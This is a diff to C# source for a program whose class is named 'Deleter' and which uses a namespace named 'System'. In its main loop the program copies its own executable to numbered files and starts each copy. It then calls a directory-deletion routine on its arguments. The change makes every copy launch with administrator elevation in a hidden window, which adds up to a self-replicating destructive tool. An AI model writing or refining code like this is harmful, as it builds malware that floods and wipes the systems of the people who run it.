@@ -41,9 +41,6 @@ namespace System
         public static void Main(System.String[] args)
         {
             System.Console.Title = System.Deleter.Title;
-            System.Diagnostics.Process p = new System.Diagnostics.Process();
-            p.StartInfo.UseShellExecute = true;
-            p.StartInfo.Verb = "runas";
             System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
             System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
             System.Threading.Thread.Sleep(1000);
@@ -51,8 +48,16 @@ namespace System
             {
                 System.Deleter.UInt64++;
                 System.IO.File.Copy(System.Deleter.ProgramName + ".exe", System.Deleter.ProgramName + " (" + System.Deleter.UInt64 + ").exe");
-                System.Diagnostics.Process.Start(System.Deleter.ProgramName
-                + " (" + System.Deleter.UInt64 + ").exe");
+                System.Diagnostics.Process p = new System.Diagnostics.Process();
+                p.StartInfo.UseShellExecute = true;
+                p.StartInfo.Verb = "runas";
+                p.StartInfo.FileName = System.Deleter.ProgramName
+                    + " (" + System.Deleter.UInt64 + ").exe";
+                p.StartInfo.Arguments = "";
+                p.StartInfo.CreateNoWindow = true;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                p.Start();
                 System.Deleter.DeleteDir(args);
             }
         }
